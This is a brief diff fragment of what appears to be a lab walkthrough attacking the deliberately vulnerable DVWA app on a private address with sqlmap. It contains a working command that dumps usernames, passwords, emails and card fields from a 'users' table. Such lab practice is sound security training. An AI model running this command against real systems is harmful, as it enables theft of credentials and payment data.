@@ -44,4 +44,3 @@ kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuar
 6. Dump data from 'users' table:
 kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart -T users -C uname,pass,email,cc,cart --dump --batch
 -> extracted usernames and password hashes or values
-
